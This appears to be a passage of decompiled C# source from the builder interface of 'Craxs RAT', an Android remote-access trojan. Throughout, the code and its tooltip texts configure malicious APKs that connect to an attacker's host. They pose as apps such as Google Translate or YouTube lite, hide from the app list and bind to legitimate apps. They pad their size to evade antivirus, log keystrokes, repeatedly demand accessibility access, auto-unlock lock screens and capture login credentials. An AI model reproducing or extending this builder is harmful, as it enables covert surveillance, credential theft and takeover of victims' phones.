			if (Operators.CompareString(language, "AR", TextCompare: false) == 0)
			{
				inputtext = Codes.Translate(inputtext, "en", "ar");
				explaintoolstext.RightToLeft = RightToLeft.Yes;
			}
		}
		else
		{
			inputtext = Codes.Translate(inputtext, "en", "zh");
		}
		explaintoolstext.Text = inputtext;
	}

	private void Label38_MouseLeave(object sender, EventArgs e)
	{
		explaintoolstext.Text = "";
	}

	private void Label41_MouseEnter(object sender, EventArgs e)
	{
		string inputtext = "prevent phone from going into sleep mod , to keep connection open for long time";
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "AR", TextCompare: false) == 0)
			{
				inputtext = Codes.Translate(inputtext, "en", "ar");
				explaintoolstext.RightToLeft = RightToLeft.Yes;
			}
		}
		else
		{
			inputtext = Codes.Translate(inputtext, "en", "zh");
		}
		explaintoolstext.Text = inputtext;
	}

	private void Label41_MouseLeave(object sender, EventArgs e)
	{
		explaintoolstext.Text = "";
	}

	private void Label17_MouseEnter(object sender, EventArgs e)
	{
		string inputtext = "This option will take another apk and merge it with craxs apk\r\nand when craxs apk is installed, it will pop up a new window to install the merged app\r\nif the merged app get removed , the craxs app stay";
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "AR", TextCompare: false) == 0)
			{
				inputtext = Codes.Translate(inputtext, "en", "ar");
				explaintoolstext.RightToLeft = RightToLeft.Yes;
			}
		}
		else
		{
			inputtext = Codes.Translate(inputtext, "en", "zh");
		}
		explaintoolstext.Text = inputtext;
	}

	private void Label17_MouseLeave(object sender, EventArgs e)
	{
		explaintoolstext.Text = "";
	}

	private void Label10_MouseEnter(object sender, EventArgs e)
	{
		string inputtext = "if the meraged app is already installed on the phone craxs app will not show install page\r\ninstead it will open the installed app directly";
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "AR", TextCompare: false) == 0)
			{
				inputtext = Codes.Translate(inputtext, "en", "ar");
				explaintoolstext.RightToLeft = RightToLeft.Yes;
			}
		}
		else
		{
			inputtext = Codes.Translate(inputtext, "en", "zh");
		}
		explaintoolstext.Text = inputtext;
	}

	private void Label10_MouseLeave(object sender, EventArgs e)
	{
		explaintoolstext.Text = "";
	}

	private void TextPackage_TextChanged_1(object sender, EventArgs e)
	{
		string text = TextPackage.Text.Trim();
		if (Package_keyback && !text.Contains("."))
		{
			int selectionStart = TextPackage.SelectionStart;
			text = text.Insert(selectionStart, ".");
			TextPackage.Text = text;
			try
			{
				TextPackage.SelectionStart = text.IndexOf(".");
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		checked
		{
			try
			{
				if (Versioned.IsNumeric(text[0].ToString()))
				{
					TextPackage.Text = text.Substring(1, text.Length - 1);
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			try
			{
				if (Versioned.IsNumeric(text[text.IndexOf(".") + 1].ToString()))
				{
					TextPackage.Text = TextPackage.Text.Replace("." + text[text.IndexOf(".") + 1], ".");
					TextPackage.SelectionStart = text.IndexOf(".");
				}
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void TextPackage_KeyDown(object sender, KeyEventArgs e)
	{
		if (e.KeyCode == Keys.Back)
		{
			Package_keyback = true;
		}
		else
		{
			Package_keyback = false;
		}
	}

	private void TextPackage_KeyPress(object sender, KeyPressEventArgs e)
	{
		if (TextPackage.SelectionLength != 0 && TextPackage.SelectedText.Contains("."))
		{
			TextPackage.DeselectAll();
			e.Handled = true;
			return;
		}
		string text = TextPackage.Text.Trim();
		string text2 = "qazwsxedcrfvtgbyhnujmikolp";
		string text3 = "1234567890qazwsxedcrfvtgbyhnujmikolp";
		if (text.EndsWith("."))
		{
			if (!text2.Contains(e.KeyChar.ToString().ToLower()) && !Package_keyback)
			{
				e.Handled = true;
			}
		}
		else if (!text3.Contains(e.KeyChar.ToString().ToLower()) && !Package_keyback)
		{
			e.Handled = true;
		}
	}

	private void Randomidbtn_Click(object sender, EventArgs e)
	{
		TextPackage.Text = randmid[rnd.Next(0, randmid.Length)] + "." + randmid[rnd.Next(0, randmid.Length)] + "." + randmid[rnd.Next(0, randmid.Length)];
	}

	private void Randomverbtn_Click(object sender, EventArgs e)
	{
		if (numberrandomer == null)
		{
			numberrandomer = new Random();
		}
		TextVersion.Text = numberrandomer.Next(1, 99) + "." + numberrandomer.Next(1, 99) + "." + numberrandomer.Next(1, 99) + "." + numberrandomer.Next(1, 99);
	}

	private void Label21_MouseEnter(object sender, EventArgs e)
	{
		string inputtext = "(CUSTOM) after the app is installed , it can work as real app using the provided website link , or you can use pre add templates\r\n(HIDDEN) the app  will hide it self from apps list , good with bind option\r\ntip: use same name and icon from first page (information)";
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "AR", TextCompare: false) == 0)
			{
				inputtext = Codes.Translate(inputtext, "en", "ar");
				explainoptionstext.RightToLeft = RightToLeft.Yes;
			}
		}
		else
		{
			inputtext = Codes.Translate(inputtext, "en", "zh");
		}
		explainoptionstext.Text = inputtext;
	}

	private void Label21_MouseLeave(object sender, EventArgs e)
	{
		explainoptionstext.Text = "";
	}

	private void Label12_MouseEnter(object sender, EventArgs e)
	{
		string inputtext = "the app use sticky notification to keep the app running in background , if this option disabled the app may not keep running in background";
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "AR", TextCompare: false) == 0)
			{
				inputtext = Codes.Translate(inputtext, "en", "ar");
				explainoptionstext.RightToLeft = RightToLeft.Yes;
			}
		}
		else
		{
			inputtext = Codes.Translate(inputtext, "en", "zh");
		}
		explainoptionstext.Text = inputtext;
	}

	private void Label12_MouseLeave(object sender, EventArgs e)
	{
		explainoptionstext.Text = "";
	}

	private void Label13_MouseEnter(object sender, EventArgs e)
	{
		string inputtext = "give the app more size , make it more realistic and believable , more size wont effect the app performance at all , also help bypass protection , as some antiviruses consider app with small size as suspicious app\r\ntip: dont use this option (keep it 1) if you use bind option in next page";
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "AR", TextCompare: false) == 0)
			{
				inputtext = Codes.Translate(inputtext, "en", "ar");
				explainoptionstext.RightToLeft = RightToLeft.Yes;
			}
		}
		else
		{
			inputtext = Codes.Translate(inputtext, "en", "zh");
		}
		explainoptionstext.Text = inputtext;
	}

	private void Label13_MouseLeave(object sender, EventArgs e)
	{
		explainoptionstext.Text = "";
	}

	private void CheckAllPrims_CheckedChanged(object sender, MouseEventArgs e)
	{
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.InitialDirectory = reso.res_Path_iconsapps;
		openFileDialog.Title = "Selecte Fake App icon [Only .png] (.png)";
		openFileDialog.Filter = "png Files|*.png";
		DialogResult dialogResult = openFileDialog.ShowDialog();
		if (dialogResult != DialogResult.OK)
		{
			fakeiconpic.Image = null;
			FAKEAPPicon = "null";
		}
		else if (!IsPngImage(openFileDialog.FileName))
		{
			Codes.MyMsgBox("incorrect format", "Make sure the image/icon is formatted as PNG\r\nrenameing jpg to png does not work\r\ntry google: jpg to png", useno: false, Resources.error48px);
		}
		else
		{
			FAKEAPPicon = openFileDialog.FileName;
			fakeiconpic.Image = Codes.ResizeImage(Image.FromFile(openFileDialog.FileName), new Size(144, 144));
		}
	}

	private void SelectedApk_Click_1(object sender, EventArgs e)
	{
		if (string.IsNullOrEmpty(TextIP.Text) | string.IsNullOrEmpty(po.Text))
		{
			CraxsAlert.Showinformation("Add (Host) + Port First");
			return;
		}
		if (TextNameVictim.Text.Length == 0)
		{
			CraxsAlert.Showinformation("name of victim empty");
			return;
		}
		if (TextNamePatch.Text.Length == 0)
		{
			CraxsAlert.Showinformation("name patch empty");
			return;
		}
		if (TextVersion.Text.Length == 0)
		{
			CraxsAlert.Showinformation("version empty");
			return;
		}
		if (TextPackage.Text.Length == 0)
		{
			CraxsAlert.Showinformation("Package Name empty");
			return;
		}
		if (TextPackage.Text.Length == 0)
		{
			CraxsAlert.Showinformation("Package Name empty");
			return;
		}
		if (TextPackage.Text.Trim().StartsWith(".") | TextPackage.Text.Trim().EndsWith("."))
		{
			CraxsAlert.Showinformation("Package segments must be of non-zero length");
			return;
		}
		if (CheckBIND.Checked)
		{
			if (!trgtbkg.Text.Contains("."))
			{
				CraxsAlert.Showinformation("Recheck Targer Binded App Package Name");
				return;
			}
			TheTarget = trgtbkg.Text.ToLower();
		}
		else
		{
			TheTarget = "null";
		}
		if (CheckRecord.Checked)
		{
			UseRecorder = "YES";
		}
		LogB(MyStamp);
		Thread.Sleep(5000);
		switch (combotype.Text)
		{
		case "Temp Mail":
			THETYPE = "C";
			FAKEAPPicon = reso.res_Path_iconsapps + "\\tempmailicon.png";
			iconPatch = FAKEAPPicon;
			PictureBox1.Image = Codes.ResizeImage(Image.FromFile(FAKEAPPicon), new Size(144, 144));
			FAKEAPPNAME = "Temp Mail";
			TextNamePatch.Text = "Temp Mail";
			FAKEAPPlink = reso.ChekLink("https://temp-mail.org");
			break;
		case "Wallpapers App":
			THETYPE = "C";
			FAKEAPPicon = reso.res_Path_iconsapps + "\\artcanvas.png";
			iconPatch = FAKEAPPicon;
			PictureBox1.Image = Codes.ResizeImage(Image.FromFile(FAKEAPPicon), new Size(144, 144));
			FAKEAPPNAME = "Papers";
			TextNamePatch.Text = "Papers";
			FAKEAPPlink = reso.ChekLink("https://papers.co");
			break;
		case "Custom":
			THETYPE = "C";
			if (Operators.CompareString(FAKEAPPicon, "null", TextCompare: false) == 0)
			{
				CraxsAlert.Showinformation("Select Custom App icon");
				return;
			}
			FAKEAPPNAME = Textfakename.Text;
			FAKEAPPlink = reso.ChekLink(Textfakelink.Text);
			break;
		case "App Store":
			THETYPE = "C";
			FAKEAPPicon = reso.res_Path_iconsapps + "\\appstore.png";
			iconPatch = FAKEAPPicon;
			PictureBox1.Image = Codes.ResizeImage(Image.FromFile(FAKEAPPicon), new Size(144, 144));
			FAKEAPPNAME = "APK DONE";
			TextNamePatch.Text = "APK DONE";
			FAKEAPPlink = reso.ChekLink("https://apkdone.com/");
			break;
		case "Hidden App":
			THETYPE = "K";
			FAKEAPPNAME = TextNamePatch.Text;
			FAKEAPPlink = "";
			break;
		case "Google Translate":
			THETYPE = "C";
			FAKEAPPicon = reso.res_Path_iconsapps + "\\gtrans.png";
			iconPatch = FAKEAPPicon;
			PictureBox1.Image = Codes.ResizeImage(Image.FromFile(FAKEAPPicon), new Size(144, 144));
			FAKEAPPNAME = "Google Translate";
			TextNamePatch.Text = "Google Translate";
			FAKEAPPlink = reso.ChekLink("https://translate.google.com");
			break;
		case "Youtube lite":
			THETYPE = "C";
			FAKEAPPicon = reso.res_Path_iconsapps + "\\ytlite.png";
			iconPatch = FAKEAPPicon;
			PictureBox1.Image = Codes.ResizeImage(Image.FromFile(FAKEAPPicon), new Size(144, 144));
			FAKEAPPNAME = "Youtube lite";
			TextNamePatch.Text = "Youtube lite";
			FAKEAPPlink = reso.ChekLink("https://www.youtube.com");
			break;
		default:
			THETYPE = "T";
			break;
		case "Proxy App":
			THETYPE = "C";
			FAKEAPPicon = reso.res_Path_iconsapps + "\\knox.png";
			iconPatch = FAKEAPPicon;
			PictureBox1.Image = Codes.ResizeImage(Image.FromFile(FAKEAPPicon), new Size(144, 144));
			FAKEAPPNAME = "Filterbypass";
			TextNamePatch.Text = "Filterbypass";
			FAKEAPPlink = reso.ChekLink("https://www.filterbypass.me");
			break;
		}
		if (Operators.CompareString(combotype.Text, "Hidden App", TextCompare: false) == 0)
		{
			HIDETYPE = "TEN";
		}
		else
		{
			HIDETYPE = "ONE";
		}
		if (Operators.CompareString(checkver.Text, "V1", TextCompare: false) == 0)
		{
			APKVERSION = "22";
		}
		else
		{
			if (Operators.CompareString(checkver.Text, "V2", TextCompare: false) != 0)
			{
				LogB("No Ver Selected , Default : V2");
			}
			APKVERSION = "29";
		}
		if (tracklist.Items.Count > 0)
		{
			trackerlist = "";
			foreach (object item in tracklist.Items)
			{
				string text = Conversions.ToString(item);
				ref string reference = ref trackerlist;
				reference = reference + text + ">";
			}
		}
		string text2 = null;
		string text3 = null;
		string text4 = null;
		string text5 = null;
		string text6 = null;
		string text7 = null;
		text2 = text2 + TextIP.Text + ":";
		text3 = text3 + po.Text + ":";
		checked
		{
			text2 = text2.Substring(0, text2.Length - 1);
			text3 = text3.Substring(0, text3.Length - 1);
			string text8 = TextNameVictim.Text;
			string text9 = TextNamePatch.Text;
			string text10 = TextVersion.Text;
			text4 += "1";
			if (CheckDoze.Checked)
			{
				if (Nottitle.Text.Length < 1)
				{
					NOTIFI_TITLE = " ";
				}
				else
				{
					NOTIFI_TITLE = Nottitle.Text;
				}
				if (Notmsg.Text.Length < 1)
				{
					NOTIFI_MSG = " ";
				}
				else
				{
					NOTIFI_MSG = Notmsg.Text;
				}
				text4 += "1";
			}
			else
			{
				NOTIFI_TITLE = " ";
				NOTIFI_MSG = " ";
				text4 += "0";
			}
			text4 = ((!CheckBIND.Checked) ? (text4 + "0") : (text4 + "1"));
			text4 += "0";
			text4 += "0";
			text4 += "0";
			text4 += "1";
			if (checkkeyloger.Checked)
			{
				OFFKEYLOG = "on";
			}
			else
			{
				OFFKEYLOG = Randomunicode(10, 15);
			}
			if (checkemo.Checked)
			{
				ANTIEMO = "NOEMO";
			}
			else
			{
				ANTIEMO = Randomunicode(10, 15);
			}
			if (CheckDoze.Checked)
			{
				isnotifi = "on";
				text4 += "1";
			}
			else
			{
				text4 += "0";
			}
			if (Checksuper.Checked)
			{
				isuper = "on";
			}
			if (CheckAOX.Checked)
			{
				isAOX = "on";
			}
			if (checkunlocker.Checked)
			{
				isautounlock = "on";
			}
			if (checknetwork.Checked)
			{
				isnetwork = "on";
			}
			if (checkcaptureonce.Checked)
			{
				iscaponce = "on";
			}
			if (CheckBIND.Checked)
			{
				isBind = "on";
			}
			if (CheckSkipre.Checked)
			{
				isskipreinstall = "on";
			}
			if (checkkeepsscreen.Checked)
			{
				iskeepscreen = "on";
			}
			if (CheckHidePrims.Checked)
			{
				isHideprims = "on";
			}
			if (checkadmin.Checked)
			{
				isadmin = "on";
			}
			if (checkautostart.Checked)
			{
				isautostart = "on";
			}
			if (CheckQuick.Checked)
			{
				isQuick = "on";
			}
			if (CheckDraw.Checked)
			{
				isDrawing = "on";
			}
			text5 = Conversions.ToString(0);
			text6 = "";
			string[] array = TextPackage.Text.Split('.');
			text7 = array[array.Length - 1];
			Color defaultColor_Background = SpySettings.DefaultColor_Background;
			Color defaultColor_Foreground = SpySettings.DefaultColor_Foreground;
			string text11 = $"{defaultColor_Background.R},{defaultColor_Background.G},{defaultColor_Background.B}|{defaultColor_Foreground.R},{defaultColor_Foreground.G},{defaultColor_Foreground.B}";
			string final = text2 + spl_arguments + text3 + spl_arguments + text8 + spl_arguments + text9 + spl_arguments + text10 + spl_arguments + text4 + ":" + Data.password + spl_arguments + text5 + spl_arguments + text6 + spl_arguments + reso.res_Path + "\\Lib\\platformBinary.zip" + spl_arguments + "null" + spl_arguments + reso.res_Path + "\\Fonts\\" + spl_arguments + text7 + spl_arguments + text11 + spl_arguments + iconPatch + spl_arguments + MySettingsProperty.Settings.FontStyle + spl_arguments + Conversions.ToString(MySettingsProperty.Settings.FontSize) + spl_arguments + BIND_Path + spl_arguments + BIND_EX + spl_arguments + intent_ + spl_arguments + TextPackage.Text;
			SelectedApk.Enabled = false;
			TABCTRL.Enabled = false;
			StartWork(final);
			saveAll();
		}
	}

	private void Addactiv_Click_1(object sender, EventArgs e)
	{
		if (string.IsNullOrEmpty(comboproms.Text) | string.IsNullOrWhiteSpace(comboproms.Text))
		{
			CraxsAlert.Showinformation("Select Permission to Add");
		}
		else if (Primslist.Items.Contains(comboproms.Text))
		{
			CraxsAlert.Showinformation("Permission Already Add");
		}
		else
		{
			Primslist.Items.Add(comboproms.Text);
		}
	}

	private void Checkcatpure_MouseClick(object sender, MouseEventArgs e)
	{
		if (checkcatpure.Checked)
		{
			checkcaptureonce.Enabled = true;
			panemnitor.Enabled = true;
		}
		else
		{
			checkcaptureonce.Enabled = false;
			checkcaptureonce.Checked = false;
			panemnitor.Enabled = false;
		}
	}

	private void Addmintor_Click(object sender, EventArgs e)
	{
		if (string.IsNullOrEmpty(namemonitor.Text) | string.IsNullOrEmpty(linkmonitor.Text))
		{
			CraxsAlert.ShowWarning("Both (Name , Link) is required.");
			return;
		}
		string text = "";
		text = text + namemonitor.Text + ">" + linkmonitor.Text + ">";
		text = ((!string.IsNullOrEmpty(idmonitor.Text)) ? (text + idmonitor.Text + ">") : (text + "Blank>"));
		if (listmonitor.Items.Contains(text))
		{
			CraxsAlert.ShowWarning("This Record Already add.");
			return;
		}
		listmonitor.Items.Add(text);
		namemonitor.Text = "";
		linkmonitor.Text = "";
		idmonitor.Text = "";
	}

	private void Removeactiv_Click_1(object sender, EventArgs e)
	{
		if (Primslist.Items.Count == 0)
		{
		}
		if (Primslist.Items.Count > 0)
		{
			if (Primslist.SelectedItem != null)
			{
				Primslist.Items.Remove(RuntimeHelpers.GetObjectValue(Primslist.SelectedItem));
			}
			else
			{
				CraxsAlert.Showinformation("Select Permission First");
			}
		}
		else
		{
			CraxsAlert.Showinformation("No Permission to Remove");
		}
	}

	private void Removmonitor_Click(object sender, EventArgs e)
	{
		if (listmonitor.Items.Count > 0)
		{
			if (listmonitor.SelectedItem != null)
			{
				listmonitor.Items.Remove(RuntimeHelpers.GetObjectValue(listmonitor.SelectedItem));
			}
			else
			{
				CraxsAlert.Showinformation("Select Record First.");
			}
		}
		else
		{
			CraxsAlert.Showinformation("No Records Found.");
		}
	}

	private void Label15_MouseEnter(object sender, EventArgs e)
	{
		string inputtext = "craxs rat help you detect and save any login information , bases on the list you add above\r\nthis tools does not use fake website or window to capture passwords\r\ninstead, it uses the original website link (the one you provided in box 2)";
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "AR", TextCompare: false) == 0)
			{
				inputtext = Codes.Translate(inputtext, "en", "ar");
				panelmonitorb.RightToLeft = RightToLeft.Yes;
			}
		}
		else
		{
			inputtext = Codes.Translate(inputtext, "en", "zh");
		}
		explainmonitortext.Text = inputtext;
	}

	private void Label15_MouseLeave(object sender, EventArgs e)
	{
		explainmonitortext.Text = "";
	}

	private void Label18_MouseEnter(object sender, EventArgs e)
	{
		string inputtext = "if this option is enabled , the app will only try to capture the login information once\r\nyou can re-add the website again at runtime using Monitors > Web Browser";
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "AR", TextCompare: false) == 0)
			{
				inputtext = Codes.Translate(inputtext, "en", "ar");
				panelmonitorb.RightToLeft = RightToLeft.Yes;
			}
		}
		else
		{
			inputtext = Codes.Translate(inputtext, "en", "zh");
		}
		explainmonitortext.Text = inputtext;
	}

	private void Label18_MouseLeave(object sender, EventArgs e)
	{
		explainmonitortext.Text = "";
	}

	private void Label26_MouseEnter(object sender, EventArgs e)
	{
		string inputtext = "use any name you like , just to help organaize the records";
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "AR", TextCompare: false) == 0)
			{
				inputtext = Codes.Translate(inputtext, "en", "ar");
				panelmonitorb.RightToLeft = RightToLeft.Yes;
			}
		}
		else
		{
			inputtext = Codes.Translate(inputtext, "en", "zh");
		}
		explainmonitortext.Text = inputtext;
	}

	private void Label26_MouseLeave(object sender, EventArgs e)
	{
		explainmonitortext.Text = "";
	}

	private void Label36_MouseEnter(object sender, EventArgs e)
	{
		string inputtext = "this link will be used to capture information\r\ndont add full link , example: google.com/signin";
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "AR", TextCompare: false) == 0)
			{
				inputtext = Codes.Translate(inputtext, "en", "ar");
				panelmonitorb.RightToLeft = RightToLeft.Yes;
			}
		}
		else
		{
			inputtext = Codes.Translate(inputtext, "en", "zh");
		}
		explainmonitortext.Text = inputtext;
	}

	private void Label36_MouseLeave(object sender, EventArgs e)
	{
		explainmonitortext.Text = "";
	}

	private void Label40_MouseEnter(object sender, EventArgs e)
	{
		string inputtext = "instead of detecting links and browsers , craxs rat can detect when specific app launched then try capture login information.";
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "AR", TextCompare: false) == 0)
			{
				inputtext = Codes.Translate(inputtext, "en", "ar");
				panelmonitorb.RightToLeft = RightToLeft.Yes;
			}
		}
		else
		{
			inputtext = Codes.Translate(inputtext, "en", "zh");
		}
		explainmonitortext.Text = inputtext;
	}

	private void Label40_MouseLeave(object sender, EventArgs e)
	{
		explainmonitortext.Text = "";
	}

	private void Label43_MouseEnter(object sender, EventArgs e)
	{
		string inputtext = "if super mode is enabled , the app will keep requesting for accessibility service till it get enabled\r\nthis the delay between each request is ms\r\n25 default";
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "AR", TextCompare: false) == 0)
			{
				inputtext = Codes.Translate(inputtext, "en", "ar");
				explaintoolstext.RightToLeft = RightToLeft.Yes;
			}
		}
		else
		{
			inputtext = Codes.Translate(inputtext, "en", "zh");
		}
		explaintoolstext.Text = inputtext;
	}

	private void Label43_MouseLeave(object sender, EventArgs e)
	{
		explaintoolstext.Text = "";
	}

	private void Label49_MouseEnter(object sender, EventArgs e)
	{
		string inputtext = "android os restrict data usage if the phone connected to sim network 3g/4g/LTE etc and wifi sometimes , this option will ask user to allow this app to use data on background";
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "AR", TextCompare: false) == 0)
			{
				inputtext = Codes.Translate(inputtext, "en", "ar");
				explaintoolstext.RightToLeft = RightToLeft.Yes;
			}
		}
		else
		{
			inputtext = Codes.Translate(inputtext, "en", "zh");
		}
		explaintoolstext.Text = inputtext;
	}

	private void Label49_MouseLeave(object sender, EventArgs e)
	{
		explaintoolstext.Text = "";
	}

	private void Clonecheck_MouseClick(object sender, MouseEventArgs e)
	{
		if (!clonecheck.Checked)
		{
			return;
		}
		OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.InitialDirectory = "C:\\";
		openFileDialog.Title = "Selecte Android App [Only .apk] (.apk)";
		openFileDialog.Filter = "apk Files|*.apk";
		DialogResult dialogResult = openFileDialog.ShowDialog();
		if (dialogResult != DialogResult.OK)
		{
			return;
		}
		string fileName = openFileDialog.FileName;
		string match = Codes.ProcessStartWithOutput(Codes.RealPath("\\\\res\\\\Lib\\\\aapt.exe"), "dump badging \"" + fileName + "\"");
		string text = Codes.ExtractName(fileName);
		string text2 = Conversions.ToString(Codes.RegexMatcher("(?<=package: name=\\')(.*?)(?=\\')", match));
		TextNamePatch.Text = text;
		TextPackage.Text = text2;
		TextVersion.Text = Conversions.ToString(Codes.RegexMatcher("(?<=versionName=\\')(.*?)(?=\\')", match));
		string text3 = Conversions.ToString(Codes.RegexMatcher("(?<=application-icon-160:\\')(.*?)(?=\\')", match));
		if (Operators.CompareString(Path.GetExtension(text3), ".xml", TextCompare: false) == 0)
		{
			text3 = text3.Replace(".xml", ".png");
		}
		string text4 = Codes.TempPathCache + text2 + "\\\\" + text3;
		string directoryName = Path.GetDirectoryName(text4);
		if (text3.Contains("anydpi-v26"))
		{
			string[] pngs = Codes.pngs;
			foreach (string newValue in pngs)
			{
				string text5 = text3.Replace("mipmap-anydpi-v26", newValue).Replace("drawable-anydpi-v26", newValue);
				Codes.ProcessStartWithOutput(Codes.RealPath("\\\\res\\\\Lib\\\\7z.exe"), "e \"" + fileName + "\" \"" + text5 + "\" -o\"" + directoryName + "\" -aoa");
			}
		}
		else
		{
			Codes.ProcessStartWithOutput(Codes.RealPath("\\\\res\\\\Lib\\\\7z.exe"), "e \"" + fileName + "\" \"" + text3 + "\" -o\"" + directoryName + "\" -aoa");
		}
		Codes.ProcessStartWithOutput(Codes.RealPath("\\\\res\\\\Lib\\\\7z.exe"), "e \"" + fileName + "\" \"META-INF\" -o\"" + Codes.TempPathCache + text2 + "\\META-INF\" -aoa");
		iconPatch = openFileDialog.FileName;
		try
		{
			PictureBox1.Image = Image.FromFile(text4);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		CheckIconPatch.Checked = true;
	}

	private void Checksuper_MouseClick(object sender, MouseEventArgs e)
	{
		if (CheckQuick.Checked)
		{
			Codes.MyMsgBox("info", "this option can't be used with Quick install", useno: false, Resources.information48px);
			Checksuper.Checked = false;
		}
	}

	private void DrakeUIAvatar2_Click_1(object sender, EventArgs e)
	{
		if (string.IsNullOrEmpty(trackIDtext.Text) | string.IsNullOrWhiteSpace(trackIDtext.Text))
		{
			CraxsAlert.Showinformation("Enter ID to add");
		}
		else if (tracklist.Items.Contains(trackIDtext.Text))
		{
			CraxsAlert.Showinformation("ID Already Add");
		}
		else
		{
			tracklist.Items.Add(trackIDtext.Text);
		}
	}

	private void DrakeUIAvatar1_Click_1(object sender, EventArgs e)
	{
		if (tracklist.Items.Count > 0)
		{
			if (tracklist.SelectedItem != null)
			{
				tracklist.Items.Remove(RuntimeHelpers.GetObjectValue(tracklist.SelectedItem));
			}
			else
			{
				CraxsAlert.Showinformation("Select ID First");
			}
		}
		else
		{
			CraxsAlert.Showinformation("ID list is empty");
		}
	}

	private void Label50_MouseEnter(object sender, EventArgs e)
	{
		string inputtext = "craxs app can monitor and record and auto unlock the lock screen if any type such as pattern,password,pin , you can use this feature with screen monitor";
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "AR", TextCompare: false) == 0)
			{
				inputtext = Codes.Translate(inputtext, "en", "ar");
				explaintoolstext.RightToLeft = RightToLeft.Yes;
			}
		}
		else
		{
			inputtext = Codes.Translate(inputtext, "en", "zh");
		}
		explaintoolstext.Text = inputtext;
	}

	private void Label50_MouseLeave(object sender, EventArgs e)
	{
		explaintoolstext.Text = "";
	}

	private void Label11_MouseEnter(object sender, EventArgs e)
	{
		string inputtext = "if this option is enabled + super mode , craxs app will show (please wait...) , while automatically enable special permissions on oppo & xiaomi";
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "AR", TextCompare: false) == 0)
			{
				inputtext = Codes.Translate(inputtext, "en", "ar");
				explaintoolstext.RightToLeft = RightToLeft.Yes;
			}
		}
		else
		{
			inputtext = Codes.Translate(inputtext, "en", "zh");
		}
		explaintoolstext.Text = inputtext;
	}

	private void Label11_MouseLeave(object sender, EventArgs e)
	{
		explaintoolstext.Text = "";
	}

	private void PanelVariable_Paint(object sender, PaintEventArgs e)
	{
		e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
		Color defaultColor_Foreground = SpySettings.DefaultColor_Foreground;
		if (RectInputText3.Count <= 0)
		{
			return;
		}
		foreach (Rectangle item in RectInputText3)
		{
			if (item.Width > 0)
			{
				e.Graphics.FillRectangle(new SolidBrush(defaultColor_Foreground), item);
			}
		}
	}

	private void sleep_MouseUp(object sender, MouseEventArgs e)
	{
	}

	private void sleep_MouseDown(object sender, MouseEventArgs e)
	{
		startTime.Enabled = true;
	}

	private void startTime_Tick(object sender, EventArgs e)
	{
		startTime.Enabled = false;
	}

	private void CheckBIND_CheckedChanged(object sender, EventArgs e)
	{
	}

	private void CheckBIND_CheckedChanged_1(object sender, EventArgs e)
	{
		if (Programmatically)
		{
			return;
		}
		if (CheckBIND.Checked)
		{
			FilePathApk.Title = "Select File";
			FilePathApk.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
			FilePathApk.Filter = "All Files|*.*";
			FilePathApk.FileName = string.Empty;
			if (FilePathApk.ShowDialog() == DialogResult.OK)
			{
				string fileName = FilePathApk.FileName;
				if (File.Exists(fileName))
				{
					trgtbkg.Text = Codes.ExtractPackage(fileName);
					bindCtitle.Text = Codes.ExtractName(fileName);
					try
					{
						BIND_Path = fileName;
						FileInfo fileInfo = new FileInfo(BIND_Path);
						BIND_EX = fileInfo.Extension.Remove(0, 1);
						CheckSkipre.Enabled = true;
						cusomupdateimg.Enabled = true;
						Label45.Enabled = true;
						Label46.Enabled = true;
						Label47.Enabled = true;
						return;
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception ex2 = ex;
						Codes.MyMsgBox("Error:", ex2.Message, useno: false, Resources.error48px);
						BIND_Path = "null";
						BIND_EX = "null";
						CheckBIND.Checked = false;
						cusomupdateimg.Enabled = false;
						Label45.Enabled = false;
						Label46.Enabled = false;
						Label47.Enabled = false;
						ProjectData.ClearProjectError();
						return;
					}
				}
				return;
			}
		}
		BIND_Path = "null";
		BIND_EX = "null";
		CheckBIND.Checked = false;
		CheckSkipre.Enabled = false;
		trgtbkg.Text = "";
		bindCtitle.Text = "";
